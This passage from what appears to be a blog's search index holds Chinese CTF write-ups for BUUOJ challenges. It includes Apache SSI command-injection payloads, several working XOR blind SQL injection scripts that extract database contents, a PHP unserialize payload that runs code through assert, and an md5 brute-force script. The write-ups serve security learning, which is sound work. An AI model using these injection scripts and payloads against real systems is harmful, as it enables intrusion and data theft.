&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>python</strong></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">from hashlib import md5<br> <br><span class="hljs-keyword">for</span> <span class="hljs-selector-tag">i</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10000000</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">md5</span>(<span class="hljs-built_in">str</span>(i)<span class="hljs-selector-class">.encode</span>(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<span class="hljs-selector-class">.hexdigest</span>()<span class="hljs-selector-attr">[:6]</span> == <span class="hljs-string">&#x27;6d0bc1&#x27;</span>:<br>        <span class="hljs-built_in">print</span>(i)<br></code></pre></td></tr></table></figure><p>得到很多结果，随便用一个都行</p><p><img src="/../image/BJDCTF2020-EasySearch1-2.png"></p><p>绕过md5后，我们继续分析~</p><p>绕过md5后，他将我们传入的username写入到了shtml文件里面.</p><p>意思就是 username是个注入点，我们可以控制username的内容来实现远程代码执行漏洞.</p><p>而username的格式是<code>&lt;!--#exec cmd=”id” --&gt;.</code></p><hr><p>那么让我们开始构造payload，查看一下目录下的文件</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml">http://eaa2ba87-d2ea-4326-9975-cd0555e9672c.node5.buuoj.cn:81/index.php<br><br>POST：<br>username=<span class="hljs-comment">&lt;!--#exec cmd=&quot;ls ../&quot;--&gt;</span>&amp;password=2020666<br></code></pre></td></tr></table></figure><p>这里显示[!] Header error .</p><p><img src="/../image/BJDCTF2020-EasySearch1-3.png"></p><p>按F12在网络中找到index.php的标头</p><p><img src="/../image/BJDCTF2020-EasySearch1-4.png"></p><p>发现了我们写入的shtml文件的位置，去访问一下. </p><p><img src="/../image/BJDCTF2020-EasySearch1-5.png"></p><p>可以看到flag，文件，重新写一个命令，来读取flag</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml">http://eaa2ba87-d2ea-4326-9975-cd0555e9672c.node5.buuoj.cn:81/index.php<br><br>POST：<br>username=<span class="hljs-comment">&lt;!--#exec cmd=&quot;cat ../flag_990c66bf85a09c664f0b6741840499b2&quot;--&gt;</span>&amp;password=2020666<br></code></pre></td></tr></table></figure><p>拿到flag</p><p><img src="/../image/BJDCTF2020-EasySearch1-6.png"></p><hr><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><h3 id="swp泄露"><a href="#swp泄露" class="headerlink" title="swp泄露"></a>swp泄露</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">SWP文件泄露漏洞是指在使用 Vim编辑器 编辑一个文件时，Vim会在同一目录下创建一个以<span class="hljs-string">&quot;.swp&quot;</span>结尾的临时文件来保存编辑过程中的变化，如果在编辑过程中Vim进程被意外终止或者用户没有正确地退出Vim，那么这个临时文件可能会被留下来，如果攻击者能够访问这个临时文件就可以获得原始文件的敏感信息，从而导致信息泄露，需要注意的是不同的操作失败次数将会导致产生不同后缀的交互文件，例如:index.php第一次产生的交换文件名为<span class="hljs-selector-class">.index</span><span class="hljs-selector-class">.php</span>.swp，再次意外退出后将会产生名为<span class="hljs-selector-class">.index</span><span class="hljs-selector-class">.php</span>.swo的交换文件，第三次产生的交换文件则为<span class="hljs-selector-class">.index</span><span class="hljs-selector-class">.php</span><span class="hljs-selector-class">.swn</span> <br></code></pre></td></tr></table></figure><hr><h3 id="md5碰撞"><a href="#md5碰撞" class="headerlink" title="md5碰撞"></a>md5碰撞</h3><p>有时候我们可以通过爆破数字的md5值来实现md5碰撞</p><p>比如：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">from hashlib import md5<br> <br><span class="hljs-keyword">for</span> <span class="hljs-selector-tag">i</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10000000</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">md5</span>(<span class="hljs-built_in">str</span>(i)<span class="hljs-selector-class">.encode</span>(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<span class="hljs-selector-class">.hexdigest</span>()<span class="hljs-selector-attr">[:6]</span> == <span class="hljs-string">&#x27;6d0bc1&#x27;</span>:<br>        <span class="hljs-built_in">print</span>(i)<br></code></pre></td></tr></table></figure><hr><h3 id="Apache-SSI-远程命令执行漏洞"><a href="#Apache-SSI-远程命令执行漏洞" class="headerlink" title="Apache SSI 远程命令执行漏洞"></a>Apache SSI 远程命令执行漏洞</h3><p><a href="https://blog.csdn.net/qq_45521281/article/details/107576959">详解</a></p><p>知识点：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs xml">SSI 服务器端包含<br>SSI（server-side includes）能帮我们实现什么功能：<br>SSI提供了一种对现有HTML文档增加动态内容的方法，即在html中加入动态内容。<br><br>SSI是嵌入HTML页面中的指令，在页面被提供时由服务器进行运算，以对现有HTML页面增加动态生成的内容，而无须通过CGI程序提供其整个页面，或者使用其他动态技术。<br><br>从技术角度上来说，SSI就是在HTML文件中，可以通过注释行调用的命令或指针，即允许通过在HTML页面注入脚本或远程执行任意命令。<br><br>在测试任意文件上传漏洞的时候，目标服务端可能不允许上传php后缀的文件。如果目标服务器开启了SSI与CGI支持，我们可以上传一个shtml文件，并利用<span class="hljs-comment">&lt;!--#exec cmd=&quot;ls /&quot; --&gt;</span>语法执行任意命令。<br><br>Apache SSI 远程命令执行漏洞<br>当目标服务器开启了SSI与CGI支持，我们就可以上传shtml，利用<span class="hljs-comment">&lt;!--#exec cmd=&quot;ls /&quot; --&gt;</span>语法来执行命令。<br><br>使用SSI(Server Side Include)的html文件扩展名，SSI（Server Side Include)，通常称为&quot;服务器端嵌入&quot;或者叫&quot;服务器端包含&quot;，是一种类似于ASP的基于服务器的网页制作技术。默认扩展名是 .stm、.shtm 和 .shtml。<br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 刷题笔记 </tag>
            
            <tag> swp泄露 </tag>
            
            <tag> md5碰撞 </tag>
            
            <tag> 代码审计 </tag>
            
            <tag> Apache SSI 远程命令执行漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>极客大挑战2019-FinalSQL</title>
      <link href="/2025/03/29/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-FinalSQL/"/>
      <url>/2025/03/29/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-FinalSQL/</url>
      
        <content type="html"><![CDATA[<h1 id="极客大挑战2019-FinalSQL"><a href="#极客大挑战2019-FinalSQL" class="headerlink" title="极客大挑战2019-FinalSQL"></a>极客大挑战2019-FinalSQL</h1><p>一打开是一个登录界面</p><p><img src="/../image/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-FinalSQL-1.png"></p><p>上面有几个按钮1到5全部按一遍，发现都没什么信息，除了最后一个</p><p><img src="/../image/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-FinalSQL-2.png"></p><p>这里提示我们进入第六个按钮，但是没有，但是发现url里的传参id&#x3D;5</p><p>改成</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://a394f536-<span class="hljs-number">8135</span>-<span class="hljs-number">4</span>a4b-<span class="hljs-number">9720</span>-<span class="hljs-number">535</span>d541c8f4a.node5.buuoj.cn:<span class="hljs-number">81</span>/search.php?id=<span class="hljs-number">6</span><br></code></pre></td></tr></table></figure><p>还是没有<br><img src="/../image/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-FinalSQL-3.png"></p><p>在首页的登录框试了半天发现没用，看wp后说要在这个界面sql注入。而且是异或盲注</p><h2 id="异或盲注原理"><a href="#异或盲注原理" class="headerlink" title="异或盲注原理"></a>异或盲注原理</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">1</span>^<span class="hljs-number">1</span>返回<span class="hljs-number">0</span><br><span class="hljs-number">1</span>^<span class="hljs-number">0</span>返回<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p><img src="/../image/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-FinalSQL-4.png"></p><p><img src="/../image/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-FinalSQL-5.png"></p><p>通过回显不同来进行盲注</p><p>python脚本</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs stylus">#数据库名<br>import requests<br><br>url = <span class="hljs-string">&quot;http://058f339f-0127-43e3-9be8-9873340d99d4.node4.buuoj.cn:81/search.php?id=&quot;</span><br>flag = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> <span class="hljs-selector-tag">i</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">5</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">33</span>, <span class="hljs-number">128</span>):<br>        payload = <span class="hljs-string">&quot;1^(ascii(substr((select(database())),&#123;0&#125;,1))=&#123;1&#125;)&quot;</span><span class="hljs-selector-class">.format</span>(<span class="hljs-selector-tag">i</span>,j)<br>        <span class="hljs-selector-tag">html</span> = requests<span class="hljs-selector-class">.get</span>(url+payload)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;ERROR&quot;</span> <span class="hljs-keyword">in</span> <span class="hljs-selector-tag">html</span><span class="hljs-selector-class">.text</span>:<br>            flag += <span class="hljs-built_in">chr</span>(j)<br>            print (<span class="hljs-built_in">chr</span>(j))<br>            break<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(flag)</span></span><br><br><br></code></pre></td></tr></table></figure><hr><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs stylus">#表名<br>import requests<br><br>url = <span class="hljs-string">&quot;http://058f339f-0127-43e3-9be8-9873340d99d4.node4.buuoj.cn:81/search.php?id=&quot;</span><br>flag = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> <span class="hljs-selector-tag">i</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">1000</span>):<br>        low=<span class="hljs-number">32</span><br>        high=<span class="hljs-number">128</span><br>        mid=(low+high)<span class="hljs-comment">//2</span><br>        while low &lt; high:<br>            payload = <span class="hljs-string">&quot;1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=&#x27;geek&#x27;)),&#123;0&#125;,1))&lt;&#123;1&#125;)&quot;</span><span class="hljs-selector-class">.format</span>(<span class="hljs-selector-tag">i</span>,mid)<br>           <br>            <span class="hljs-selector-id">#payload</span> = <span class="hljs-string">&quot;1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;F1naI1y&#x27;)),&#123;0&#125;,1))&lt;&#123;1&#125;)&quot;</span><span class="hljs-selector-class">.format</span>(<span class="hljs-selector-tag">i</span>, mid)<br>            <br>            <span class="hljs-selector-id">#payload</span> = <span class="hljs-string">&quot;1^(ascii(substr((select(group_concat(password))from(F1naI1y)),&#123;0&#125;,1))&lt;&#123;1&#125;)&quot;</span><span class="hljs-selector-class">.format</span>(<span class="hljs-selector-tag">i</span>, mid)<br>            <br>            <span class="hljs-selector-tag">html</span> = requests<span class="hljs-selector-class">.get</span>(url+payload)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;ERROR&quot;</span> <span class="hljs-keyword">in</span> <span class="hljs-selector-tag">html</span><span class="hljs-selector-class">.text</span>:<br>                high = mid<br>            <span class="hljs-keyword">else</span>:<br>                low = mid + <span class="hljs-number">1</span><br>            mid = (low + high) <span class="hljs-comment">// 2</span><br>        <span class="hljs-keyword">if</span> mid &lt;= <span class="hljs-number">32</span> or mid &gt;= <span class="hljs-number">127</span>:<br>            break<br>        flag += <span class="hljs-built_in">chr</span>(mid-<span class="hljs-number">1</span>)<br>        print (<span class="hljs-built_in">chr</span>(mid-<span class="hljs-number">1</span>))<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(flag)</span></span><br><br></code></pre></td></tr></table></figure><hr><p>大佬完整脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># @Author: jiaoben</span><br><span class="hljs-comment"># @Date  :  2020/05/03</span><br><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> string<br><br>url = <span class="hljs-string">&quot;http://058f339f-0127-43e3-9be8-9873340d99d4.node4.buuoj.cn:81/search.php&quot;</span><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">payload</span>(<span class="hljs-params">i, j</span>):<br>    <span class="hljs-comment"># 数据库名字</span><br>    <span class="hljs-comment">#sql = &quot;1^(ord(substr((select(group_concat(schema_name))from(information_schema.schemata)),%d,1))&gt;%d)^1&quot;%(i,j)</span><br>    <span class="hljs-comment"># 表名</span><br>    <span class="hljs-comment"># sql = &quot;1^(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)=&#x27;geek&#x27;),%d,1))&gt;%d)^1&quot;%(i,j)</span><br>    <span class="hljs-comment"># 列名</span><br>    <span class="hljs-comment"># sql = &quot;1^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;F1naI1y&#x27;)),%d,1))&gt;%d)^1&quot;%(i,j)</span><br>    <span class="hljs-comment"># 查询flag</span><br>    sql = <span class="hljs-string">&quot;1^(ord(substr((select(group_concat(password))from(F1naI1y)),%d,1))&gt;%d)^1&quot;</span> % (i, j)<br>    data = &#123;<span class="hljs-string">&quot;id&quot;</span>: sql&#125;<br>    r = requests.get(url, params=data)<br>    <span class="hljs-comment"># print (r.url)</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Click&quot;</span> <span class="hljs-keyword">in</span> r.text:<br>        res = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">else</span>:<br>        res = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">return</span> res<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>():<br>    <span class="hljs-keyword">global</span> flag<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">10000</span>):<br>        <span class="hljs-built_in">print</span>(i, <span class="hljs-string">&#x27;:&#x27;</span>)<br>        low = <span class="hljs-number">31</span><br>        high = <span class="hljs-number">127</span><br>        <span class="hljs-keyword">while</span> low &lt;= high:<br>            mid = (low + high) // <span class="hljs-number">2</span><br>            res = payload(i, mid)<br>            <span class="hljs-keyword">if</span> res:<br>                low = mid + <span class="hljs-number">1</span><br>            <span class="hljs-keyword">else</span>:<br>                high = mid - <span class="hljs-number">1</span><br>        f = <span class="hljs-built_in">int</span>((low + high + <span class="hljs-number">1</span>)) // <span class="hljs-number">2</span><br>        <span class="hljs-keyword">if</span> (f == <span class="hljs-number">127</span> <span class="hljs-keyword">or</span> f == <span class="hljs-number">31</span>):<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-comment"># print (f)</span><br>        flag += <span class="hljs-built_in">chr</span>(f)<br>        <span class="hljs-built_in">print</span>(flag)<br><br><br>exp()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;flag=&#x27;</span>, flag)<br><br><br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 刷题笔记 </tag>
            
            <tag> sql盲注 </tag>
            
            <tag> sql注入 </tag>
            
            <tag> 异或盲注 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ASIS2019-Unicorn-shop</title>
      <link href="/2025/03/29/ASIS2019-Unicorn-shop/"/>
      <url>/2025/03/29/ASIS2019-Unicorn-shop/</url>
      
        <content type="html"><![CDATA[<h1 id="ASIS2019-Unicorn-shop"><a href="#ASIS2019-Unicorn-shop" class="headerlink" title="ASIS2019-Unicorn-shop"></a>ASIS2019-Unicorn-shop</h1><p><img src="/../image/ASIS2019-Unicorn-shop-1.png"></p><p>好像是要我们买什么东西，输入4，1337，显示只能输入一个字符<br><img src="/../image/ASIS2019-Unicorn-shop-2.png"></p><p>所以这里需要输入一个unicode字符并且比1377大</p><p><a href="https://www.compart.com/en/unicode/charsets">https://www.compart.com/en/unicode/charsets</a></p><p>进去后输入ten thousand，选择一个Numeric Value等于10000的字符</p><p><img src="/../image/ASIS2019-Unicorn-shop-3.png"></p><p><img src="/../image/ASIS2019-Unicorn-shop-4.png"></p><p>然后就拿到flag了</p><p><img src="/../image/ASIS2019-Unicorn-shop-5.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 刷题笔记 </tag>
            
            <tag> unicode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NPUCTF2020-ReadlezPHP</title>
      <link href="/2025/03/29/NPUCTF2020-ReadlezPHP/"/>
      <url>/2025/03/29/NPUCTF2020-ReadlezPHP/</url>
      
        <content type="html"><![CDATA[<h1 id="NPUCTF2020-ReadlezPHP"><a href="#NPUCTF2020-ReadlezPHP" class="headerlink" title="NPUCTF2020-ReadlezPHP"></a>NPUCTF2020-ReadlezPHP</h1><p>打开源代码发现一个.&#x2F;time.php?source，访问一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">#error_reporting(0);</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HelloPhp</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;a = <span class="hljs-string">&quot;Y-m-d h:i:s&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;b = <span class="hljs-string">&quot;date&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$a</span> = <span class="hljs-variable language_">$this</span>-&gt;a;<br>        <span class="hljs-variable">$b</span> = <span class="hljs-variable language_">$this</span>-&gt;b;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>(<span class="hljs-variable">$a</span>);<br>    &#125;<br>&#125;<br><span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HelloPhp</span>;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;source&#x27;</span>]))<br>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-keyword">die</span>(<span class="hljs-number">0</span>);<br>&#125;<br><br>@<span class="hljs-variable">$ppp</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;data&quot;</span>]);<br><br><br><span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">29</span> <span class="hljs-number">06</span>:<span class="hljs-number">41</span>:<span class="hljs-number">48</span><br></code></pre></td></tr></table></figure><p>这题应该是要构造序列化来通过<code>echo $b($a);</code>拿flag</p><p>构造payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">#error_reporting(0);</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HelloPhp</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;a = <span class="hljs-string">&quot;phpinfo()&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;b = <span class="hljs-string">&quot;assert&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$a</span> = <span class="hljs-variable language_">$this</span>-&gt;a;<br>        <span class="hljs-variable">$b</span> = <span class="hljs-variable language_">$this</span>-&gt;b;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>(<span class="hljs-variable">$a</span>);<br>    &#125;<br>&#125;<br><span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HelloPhp</span>;<br><br>@<span class="hljs-variable">$ppp</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$c</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$ppp</span>;<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?d</span>ata=<span class="hljs-symbol">O:</span><span class="hljs-number">8</span><span class="hljs-symbol">:<span class="hljs-string">&quot;HelloPhp&quot;</span></span><span class="hljs-symbol">:</span><span class="hljs-number">2</span><span class="hljs-symbol">:</span>&#123;<span class="hljs-symbol">s:</span><span class="hljs-number">1</span><span class="hljs-symbol">:<span class="hljs-string">&quot;a&quot;</span></span>;<span class="hljs-symbol">s:</span><span class="hljs-number">9</span><span class="hljs-symbol">:<span class="hljs-string">&quot;phpinfo()&quot;</span></span>;<span class="hljs-symbol">s:</span><span class="hljs-number">1</span><span class="hljs-symbol">:<span class="hljs-string">&quot;b&quot;</span></span>;<span class="hljs-symbol">s:</span><span class="hljs-number">6</span><span class="hljs-symbol">:<span class="hljs-string">&quot;assert&quot;</span></span>;&#125;<br></code></pre></td></tr></table></figure><p>或者用<code>call_user_func(phpinfo)</code></p><p>然后就能在phpinfo里找到payload了</p><hr><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><h2 id="assert和eval"><a href="#assert和eval" class="headerlink" title="assert和eval"></a>assert和eval</h2><p><a href="https://blog.csdn.net/ojingzhiyuan12/article/details/88556074">PHP assert 和 eval不同</a></p><p>assert()可以将整个字符串参数当作php参数执行，<br>而类似的eval()函数是执行合法的php代码，eval()里的引号必须是双引号，因为单引号不能解析字符串里的变量$str，且必须以分号结尾，函数调用除外。</p><p>如：<br>这样是不行的。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-keyword">eval</span>(<span class="hljs-keyword">echo</span> <span class="hljs-number">1</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这样就可以了。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;echo 1;&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br>注意：assert把整个字符串参数当php代码执行，<span class="hljs-keyword">eval</span>把合法的php代码执行。<br></code></pre></td></tr></table></figure><p>call_user_func把第一个参数当作回调函数使用。<br>回调函数：把一个函数当作作为外层函数的参数，相当于把函数嵌入到外层函数中。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 刷题笔记 </tag>
            
            <tag> php特性 </tag>
            
            <tag> assert和eval </tag>
            
            <tag> 动态调用方法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>极客大挑战2019-RCE-ME</title>
      <link href="/2025/03/29/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-RCE-ME/"/>
      <url>/2025/03/29/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-RCE-ME/</url>
      
